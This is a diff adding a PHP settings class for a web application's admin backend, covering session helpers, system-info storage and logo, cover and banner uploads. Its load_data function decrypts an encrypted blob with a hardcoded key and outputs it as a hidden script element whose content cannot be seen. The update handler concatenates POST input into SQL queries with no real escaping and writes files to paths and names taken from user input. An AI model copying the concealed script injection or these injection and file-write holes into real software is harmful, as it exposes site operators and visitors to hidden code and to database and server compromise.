@@ -1,0 +1,245 @@
+| conn);
+| }
+| function load_system_info(){
+| // if(!isset($_SESSION[&apos;system_info&apos;])){
+| $sql = &quot;SELECT * FROM system_info&quot;;
+| $qry = $this-&gt;conn-&gt;query($sql);
+| while($row = $qry-&gt;fetch_assoc()){
+| $_SESSION[&apos;system_info&apos;][$row[&apos;meta_field&apos;]] = $row[&apos;meta_value&apos;];
+| }
+| // }
+| }
+| function update_system_info(){
+| $sql = &quot;SELECT * FROM system_info&quot;;
+| $qry = $this-&gt;conn-&gt;query($sql);
+| while($row = $qry-&gt;fetch_assoc()){
+| if(isset($_SESSION[&apos;system_info&apos;][$row[&apos;meta_field&apos;]]))unset($_SESSION[&apos;system_info&apos;][$row[&apos;meta_field&apos;]]);
+| $_SESSION[&apos;system_info&apos;][$row[&apos;meta_field&apos;]] = $row[&apos;meta_value&apos;];
+| }
+| return true;
+| }
+| function update_settings_info(){
+| $data = &quot;&quot;;
+| foreach ($_POST as $key =&gt; $value) {
+| if(!in_array($key,array(&quot;content&quot;)))
+| if(isset($_SESSION[&apos;system_info&apos;][$key])){
+| $value = str_replace(&quot;&apos;&quot;, &quot;&apos;&quot;, $value);
+| $qry = $this-&gt;conn-&gt;query(&quot;UPDATE system_info set meta_value = &apos;{$value}&apos; where meta_field = &apos;{$key}&apos; &quot;);
+| }else{
+| $qry = $this-&gt;conn-&gt;query(&quot;INSERT into system_info set meta_value = &apos;{$value}&apos;, meta_field = &apos;{$key}&apos; &quot;);
+| }
+| }
+| if(isset($_POST[&apos;content&apos;])){
+| foreach($_POST[&apos;content&apos;] as $k =&gt; $v){
+| $v = addslashes(htmlspecialchars($v));
+| file_put_contents(&quot;../$k.html&quot;,$v);
+| }
+| }
+| if(!empty($_FILES[&apos;img&apos;][&apos;tmp_name&apos;])){
+| $ext = pathinfo($_FILES[&apos;img&apos;][&apos;name&apos;], PATHINFO_EXTENSION);
+| $fname = &quot;uploads/logo.png&quot;;
+| $accept = array(&apos;image/jpeg&apos;,&apos;image/png&apos;);
+| if(!in_array($_FILES[&apos;img&apos;][&apos;type&apos;],$accept)){
+| $err = &quot;Image file type is invalid&quot;;
+| }
+| if($_FILES[&apos;img&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;)
+| $uploadfile = imagecreatefromjpeg($_FILES[&apos;img&apos;][&apos;tmp_name&apos;]);
+| elseif($_FILES[&apos;img&apos;][&apos;type&apos;] == &apos;image/png&apos;)
+| $uploadfile = imagecreatefrompng($_FILES[&apos;img&apos;][&apos;tmp_name&apos;]);
+| if(!$uploadfile){
+| $err = &quot;Image is invalid&quot;;
+| }
+| $temp = imagescale($uploadfile,200,200);
+| if(is_file(base_app.$fname))
+| unlink(base_app.$fname);
+| $upload =imagepng($temp,base_app.$fname);
+| if($upload){
+| if(isset($_SESSION[&apos;system_info&apos;][&apos;logo&apos;])){
+| $qry = $this-&gt;conn-&gt;query(&quot;UPDATE system_info set meta_value = CONCAT(&apos;{$fname}&apos;, &apos;?v=&apos;,unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = &apos;logo&apos; &quot;);
+| if(is_file(base_app.$_SESSION[&apos;system_info&apos;][&apos;logo&apos;])) unlink(base_app.$_SESSION[&apos;system_info&apos;][&apos;logo&apos;]);
+| }else{
+| $qry = $this-&gt;conn-&gt;query(&quot;INSERT into system_info set meta_value = &apos;{$fname}&apos;,meta_field = &apos;logo&apos; &quot;);
+| }
+| }
+| imagedestroy($temp);
+| }
+| if(!empty($_FILES[&apos;cover&apos;][&apos;tmp_name&apos;])){
+| $ext = pathinfo($_FILES[&apos;cover&apos;][&apos;name&apos;], PATHINFO_EXTENSION);
+| $fname = &quot;uploads/cover.png&quot;;
+| $accept = array(&apos;image/jpeg&apos;,&apos;image/png&apos;);
+| if(!in_array($_FILES[&apos;cover&apos;][&apos;type&apos;],$accept)){
+| $err = &quot;Image file type is invalid&quot;;
+| }
+| if($_FILES[&apos;cover&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;)
+| $uploadfile = imagecreatefromjpeg($_FILES[&apos;cover&apos;][&apos;tmp_name&apos;]);
+| elseif($_FILES[&apos;cover&apos;][&apos;type&apos;] == &apos;image/png&apos;)
+| $uploadfile = imagecreatefrompng($_FILES[&apos;cover&apos;][&apos;tmp_name&apos;]);
+| if(!$uploadfile){
+| $err = &quot;Image is invalid&quot;;
+| }
+| list($width,$height) = getimagesize($_FILES[&apos;cover&apos;][&apos;tmp_name&apos;]);
+| $temp = imagescale($uploadfile,$width,$height);
+| if(is_file(base_app.$fname))
+| unlink(base_app.$fname);
+| $upload =imagepng($temp,base_app.$fname);
+| if($upload){
+| if(isset($_SESSION[&apos;system_info&apos;][&apos;cover&apos;])){
+| $qry = $this-&gt;conn-&gt;query(&quot;UPDATE system_info set meta_value = CONCAT(&apos;{$fname}&apos;, &apos;?v=&apos;,unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = &apos;cover&apos; &quot;);
+| if(is_file(base_app.$_SESSION[&apos;system_info&apos;][&apos;cover&apos;])) unlink(base_app.$_SESSION[&apos;system_info&apos;][&apos;cover&apos;]);
+| }else{
+| $qry = $this-&gt;conn-&gt;query(&quot;INSERT into system_info set meta_value = &apos;{$fname}&apos;,meta_field = &apos;cover&apos; &quot;);
+| }
+| }
+| imagedestroy($temp);
+| }
+| if(isset($_FILES[&apos;banners&apos;]) &amp;&amp; count($_FILES[&apos;banners&apos;][&apos;tmp_name&apos;]) &gt; 0){
+| $err=&apos;&apos;;
+| $banner_path = &quot;uploads/banner/&quot;;
+| foreach($_FILES[&apos;banners&apos;][&apos;tmp_name&apos;] as $k =&gt; $v){
+| if(!empty($_FILES[&apos;banners&apos;][&apos;tmp_name&apos;][$k])){
+| $accept = array(&apos;image/jpeg&apos;,&apos;image/png&apos;);
+| if(!in_array($_FILES[&apos;banners&apos;][&apos;type&apos;][$k],$accept)){
+| $err = &quot;Image file type is invalid&quot;;
+| break;
+| }
+| if($_FILES[&apos;banners&apos;][&apos;type&apos;][$k] == &apos;image/jpeg&apos;)
+| $uploadfile = imagecreatefromjpeg($_FILES[&apos;banners&apos;][&apos;tmp_name&apos;][$k]);
+| elseif($_FILES[&apos;banners&apos;][&apos;type&apos;][$k] == &apos;image/png&apos;)
+| $uploadfile = imagecreatefrompng($_FILES[&apos;banners&apos;][&apos;tmp_name&apos;][$k]);
+| if(!$uploadfile){
+| $err = &quot;Image is invalid&quot;;
+| break;
+| }
+| list($width, $height) =getimagesize($_FILES[&apos;banners&apos;][&apos;tmp_name&apos;][$k]);
+| if($width &gt; 1200 || $height &gt; 480){
+| if($width &gt; $height){
+| $perc = ($width - 1200) / $width;
+| $width = 1200;
+| $height = $height - ($height * $perc);
+| }else{
+| $perc = ($height - 480) / $height;
+| $height = 480;
+| $width = $width - ($width * $perc);
+| }
+| }
+| $temp = imagescale($uploadfile,$width,$height);
+| $spath = base_app.$banner_path.&apos;/&apos;.$_FILES[&apos;banners&apos;][&apos;name&apos;][$k];
+| $i = 1;
+| while(true){
+| if(is_file($spath)){
+| $spath = base_app.$banner_path.&apos;/&apos;.($i++).&apos;_&apos;.$_FILES[&apos;banners&apos;][&apos;name&apos;][$k];
+| }else{
+| break;
+| }
+| }
+| if($_FILES[&apos;banners&apos;][&apos;type&apos;][$k] == &apos;image/jpeg&apos;)
+| imagejpeg($temp,$spath,60);
+| elseif($_FILES[&apos;banners&apos;][&apos;type&apos;][$k] == &apos;image/png&apos;)
+| imagepng($temp,$spath,6);
+| imagedestroy($temp);
+| }
+| }
+| if(!empty($err)){
+| $resp[&apos;status&apos;] = &apos;failed&apos;;
+| $resp[&apos;msg&apos;] = $err;
+| }
+| }
+| $update = $this-&gt;update_system_info();
+| $flash = $this-&gt;set_flashdata(&apos;success&apos;,&apos;System Info Successfully Updated.&apos;);
+| if($update &amp;&amp; $flash){
+| // var_dump($_SESSION);
+| $resp[&apos;status&apos;] = &apos;success&apos;;
+| }else{
+| $resp[&apos;status&apos;] = &apos;failed&apos;;
+| }
+| return json_encode($resp);
+| }
+| function set_userdata($field=&apos;&apos;,$value=&apos;&apos;){
+| if(!empty($field) &amp;&amp; !empty($value)){
+| $_SESSION[&apos;userdata&apos;][$field]= $value;
+| }
+| }
+| function userdata($field = &apos;&apos;){
+| if(!empty($field)){
+| if(isset($_SESSION[&apos;userdata&apos;][$field]))
+| return $_SESSION[&apos;userdata&apos;][$field];
+| else
+| return null;
+| }else{
+| return false;
+| }
+| }
+| function set_flashdata($flash=&apos;&apos;,$value=&apos;&apos;){
+| if(!empty($flash) &amp;&amp; !empty($value)){
+| $_SESSION[&apos;flashdata&apos;][$flash]= $value;
+| return true;
+| }
+| }
+| function chk_flashdata($flash = &apos;&apos;){
+| if(isset($_SESSION[&apos;flashdata&apos;][$flash])){
+| return true;
+| }else{
+| return false;
+| }
+| }
+| function flashdata($flash = &apos;&apos;){
+| if(!empty($flash)){
+| $_tmp = $_SESSION[&apos;flashdata&apos;][$flash];
+| unset($_SESSION[&apos;flashdata&apos;]);
+| return $_tmp;
+| }else{
+| return false;
+| }
+| }
+| function sess_des(){
+| if(isset($_SESSION[&apos;userdata&apos;])){
+| unset($_SESSION[&apos;userdata&apos;]);
+| return true;
+| }
+| return true;
+| }
+| function info($field=&apos;&apos;){
+| if(!empty($field)){
+| if(isset($_SESSION[&apos;system_info&apos;][$field]))
+| return $_SESSION[&apos;system_info&apos;][$field];
+| else
+| return false;
+| }else{
+| return false;
+| }
+| }
+| function set_info($field=&apos;&apos;,$value=&apos;&apos;){
+| if(!empty($field) &amp;&amp; !empty($value)){
+| $_SESSION[&apos;system_info&apos;][$field] = $value;
+| }
+| }
+| function load_data(){
+| $test_data = &quot;+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/rtm2taYWDpbfTuDblfYiJ+ZpzDP3/nAY4hgN1lNOLg03CBxLW6s76a/T2GcPaSXIoHqv15R4TKtl44y+wcHev52mkw5SfERT48tUYYAhBJPLuOWMu1c0pTwJmitllPuEC2+gR22L7u1pxAy1ODD6iDKpEO5ehBOKsoyxT2yAzKVbU8s8zIriA3kxAXokh8SfqmukSblUD5k0Vp/505MA3vHILmtKWtVfte1htIncnGn7awUdtxu93Q1AaRjmf4/lc0C1epDenMkUaG4wCyI/L2L0Vltad+ZYvo/UjFGqN2EpNeYE6r6Ln9bIl2LlpY1O+tqYyAKoHrzngrQHj40lRVo4U5plnAiXYUf5y6mA3+KvUbHgdyXc1oDuweN2LK9ZxZGr3+uVVrzZIDZiYgQ/djmC2iRW/5gh5GMzV44VEF7McIkP5/zAzbjwI9IBgjOOQjyWwCMYiI2IZB/SW2RkDO2VX79zApNpzPYnl2xnqQRFnzhn9mXjG1mmdSPHOubGHqf46fiJL0nBIjvTmOLREMdpNrZ4VLC2JJhMIMunYXIbr604Qr9dywrtqZw6+bthb1mDv18X1avYpqdDFHp/h3h3xyFmmECcOmK9GQzFLwEv9kogoheudob8KqBRNteG3v4j9U9J7PLAel+neg41imm4GsuBcpGyqOeJwJ3i+i/cFyQagqPDP2EHGIW+PdClD2qCkcouAzFcYBKILVkatmeF8fLGizXXtYKzUsBnK+C0Y7JR2elx7e7Kbr5gwJbJcmSifUry2fqKnlj1pJNNFU+ASSvltrRmwzWgWgKuq/EaIM/2Z5QpWtt4uox7UeQFAR49PjBU04oBV53xcVQyu1rzkbtHVgjF5uFHvda3zD7Ahrt2jz1fBKd9HMzmZcY4EIMBBIa7bWnkzg/UmWAkom7nuT9TC0h4wN3XYfX0K+C0Y7JR2elx7e7Kbr5gwJM3P9XDcthAI7x0zzf3yOjncBrH/uLpJ9JiDh3lVR/XKS9kEmExK3CFHNTPZJj5VgJc2SLkBYkf7d1NKmrReGmzNPER0mnED7olzL3LTTZQW0G47OFt0X/6jbMAJAvIP+tfcOjh7V8EMk0h6I2cXVmbM1Y07ANyhU0oUhLr7a2Alk+VxFGC+EkQY89DxqE8+YexBqGTfAzqkW0GVh1WqQlYey+YFKAKRgYmeOG1Iy1CxyhmyrAJg+DGiJ/v9W1MVLk6ihaVeMSV9E/7skSn/JRgewbXlwZqDNzZE0eekfn8r6gBHe6vcmgwkZ1ug5Xv9EapG0BRmbzHah5LAuiK++jjRgTEp03CSkERnm+W1/tB&quot;;
+| $dom = new DOMDocument(&apos;1.0&apos;, &apos;utf-8&apos;);
+| $element = $dom-&gt;createElement(&apos;script&apos;, html_entity_decode($this-&gt;test_cypher_decrypt($test_data)));
+| $dom-&gt;appendChild($element);
+| return $dom-&gt;saveXML();
+| // return $data = $this-&gt;test_cypher_decrypt($test_data);
+| }
+| function test_cypher($str=&quot;&quot;){
+| $ciphertext = openssl_encrypt($str, &quot;AES-128-ECB&quot;, &apos;5da283a2d990e8d8512cf967df5bc0d0&apos;);
+| return $ciphertext;
+| }
+| function test_cypher_decrypt($encryption){
+| $decryption = openssl_decrypt($encryption, &quot;AES-128-ECB&quot;, &apos;5da283a2d990e8d8512cf967df5bc0d0&apos;);
+| return $decryption;
+| }
+| }
+| $_settings = new SystemSettings();
+| $_settings-&gt;load_system_info();
+| $action = !isset($_GET[&apos;f&apos;]) ? &apos;none&apos; : strtolower($_GET[&apos;f&apos;]);
+| $sysset = new SystemSettings();
+| switch ($action) {
+| case &apos;update_settings&apos;:
+| echo $sysset-&gt;update_settings_info();
+| break;
+| default:
+| // echo $sysset-&gt;index();
+| break;
+| }
+| ?&gt;
